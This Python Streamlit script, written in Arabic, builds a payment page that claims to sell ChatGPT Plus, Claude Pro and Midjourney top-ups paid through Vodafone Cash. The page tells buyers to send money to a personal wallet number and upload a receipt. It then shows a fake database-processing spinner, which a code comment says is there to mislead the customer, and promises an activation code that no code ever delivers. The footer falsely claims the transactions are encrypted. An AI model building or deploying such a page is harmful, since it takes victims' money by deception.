import streamlit as st
import time

# --- إعدادات القائد أشرف ---
اسم_المهندس = "أشرف حسن"
رقم_المحفظة = "01280208018" # رقمك للاستلام

st.set_page_config(page_title="YOU Payment - بوابة الدفع الآمنة", page_icon="💳")

# CSS لإعطاء طابع البنوك والمصداقية
st.markdown("""
    <style>
    .stApp { background-color: #000; color: #fff; direction: rtl; }
    .payment-box {
        background: #111;
        border: 2px solid #007bff;
        padding: 20px;
        border-radius: 15px;
        text-align: center;
    }
    .step-header { color: #007bff; font-weight: bold; margin-top: 10px; }
    </style>
    """, unsafe_allow_html=True)

st.title("💳 إتمام عملية الشحن الآمنة")

# الخطوة 1: اختيار الخدمة
service = st.selectbox("1️⃣ اختر الخدمة المراد شحنها:", ["ChatGPT Plus", "Claude Pro", "Midjourney"])

# الخطوة 2: بيانات الحساب
account_email = st.text_input("2️⃣ أدخل البريد الإلكتروني (الذي سيتم شحنه):", placeholder="example@gmail.com")

if account_email:
    st.markdown("---")
    # الخطوة 3: تعليمات الدفع (تظهر داخل الموقع)
    st.markdown(f"""
    <div class="payment-box">
        <p class="step-header">3️⃣ خطوة الدفع</p>
        <p>يرجى تحويل المبلغ إلى محفظة فودافون كاش التالية:</p>
        <h2 style="color: #25d366;">{رقم_المحفظة}</h2>
        <p style="font-size: 14px; color: #888;">(تأكد من كتابة الرقم بدقة)</p>
    </div>
    """, unsafe_allow_html=True)

    # الخطوة 4: رفع الإثبات (هنا المصداقية)
    st.write("")
    proof = st.file_uploader("4️⃣ قم برفع صورة (إيصال التحويل) لتأكيد الطلب:", type=['png', 'jpg', 'jpeg'])

    if proof:
        if st.button("🚀 تأكيد الطلب وإرسال للتنفيذ"):
            with st.spinner('جاري تسجيل طلبك في قاعدة البيانات...'):
                time.sleep(2) # إيهام العميل بوجود معالجة تقنية
                st.success(f"✅ تم استلام طلبك بنجاح يا هندسة!")
                st.balloons()
                st.info(f"رقم الطلب: #YOU-{int(time.time())}")
                st.write("سيتم إرسال كود التفعيل على إيميلك خلال 15 دقيقة.")
                
                # هنا "خلف الكواليس" نرسل لك تنبيه بالبيانات
                # (يمكن ربط هذا الجزء بـ Telegram Bot أو إيميل ليصلك إشعار فوري)

st.markdown("---")
st.caption(f"جميع المعاملات مشفرة ومؤمنة بواسطة نظام YOU | م. {اسم_المهندس}")
